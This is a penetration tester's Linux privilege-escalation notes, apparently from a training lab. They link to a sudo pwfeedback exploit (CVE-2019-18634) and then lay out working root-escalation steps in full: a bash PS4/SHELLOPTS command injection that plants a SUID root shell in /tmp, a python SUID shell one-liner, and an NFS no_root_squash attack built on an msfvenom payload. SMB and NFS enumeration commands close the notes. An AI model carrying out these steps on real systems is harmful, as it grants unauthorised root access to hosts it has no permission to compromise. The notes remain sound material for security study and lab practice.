###
```
sudo earlier than 1.8.26
Check *** pwfeedback https://github.com/saleemrashid/sudo-cve-2019-18634

sudo -l

history

find .

cat /etc/os-release
uname -a


```
```
https://www.hackingarticles.in/linux-privilege-escalation-automated-script/
https://github.com/belane/linux-soft-exploit-suggester
```
```
pspy
https://github.com/DominicBreuker/pspy

```
### SUID / SGID Executables - Abusing Shell Features (#2)
Note: This will not work on Bash versions 4.4 and above.

When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.
Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:

env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2

Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

/tmp/rootbash -p

---------------------------------------------
python -c 'import os;os.execl("/bin/sh","sh","-p")'
------------------------------------------------
Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
Check the NFS share configuration on the Debian VM:

cat /etc/exports

Note that the /tmp share has root squashing disabled.
On your Kali box, switch to your root user if you are not already running as root:
sudo su

Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):

mkdir /tmp/nfs
mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs

Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf

Still using Kali's root user, make the file executable and set the SUID permission:
chmod +xs /tmp/nfs/shell.elf

Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:
/tmp/shell.elf



SMB:
https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html
echo exit | smbclient -L \\\\[ip]
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.132.104
